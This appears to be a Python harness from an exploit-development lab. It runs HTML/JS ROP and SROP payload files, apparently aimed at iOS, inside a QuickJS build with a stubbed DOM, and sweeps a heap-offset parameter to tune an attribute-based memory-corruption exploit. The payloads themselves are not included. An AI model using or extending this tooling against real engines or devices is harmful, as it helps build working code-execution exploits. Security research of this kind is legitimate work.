#!/usr/bin/env python3
"""Host H matrix for the 9,336-B attribute ROP final: pre-heap = escaped
attribute length (7,085); getAttribute returns the host-twin srop (6,006)."""
import json, os, re, subprocess, sys
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
P=open(os.path.join(PAY,'srop_host.js')).read()
def run(H):
    html=open(os.path.join(PAY,f'at_rop_final_h{H}_ios.html')).read()
    a=re.findall(r'<script>(.*?)</script>',html,re.S)[0]
    d=('var HTMLPRE="A"+("a".repeat(7084));globalThis.HTMLPRE=HTMLPRE;\n'
       'var __v={textContent:""};\n'
       'globalThis.document={getElementById:function(id){if(id==="v")return __v;if(id==="s2")return {getAttribute:function(n){return '+json.dumps(P)+';}};return null;}};\n'
       +a+'\nglobalThis.RESULT="DRIVER "+globalThis.RESULT+" V="+__v.textContent;\n')
    open('/tmp/opencode/at_rop_driver.js','w').write(d)
    p=subprocess.run(['/tmp/opencode/qjs017/build/app_multi','/tmp/opencode/at_rop_driver.js'],capture_output=True,text=True,env={**os.environ,'QJS_HEAP_LIMIT':'8388608'})
    txt=p.stderr+p.stdout; m=re.search(r'(LS C=34[^\n]*)',txt)
    return p.returncode, m.group(1) if m else 'NO_RESULT'
Hs=[int(x) for x in sys.argv[1:]] or list(range(0,601,50))
for H in Hs:
    rc,res=run(H); print(f'H={H} rc={rc} {res}')
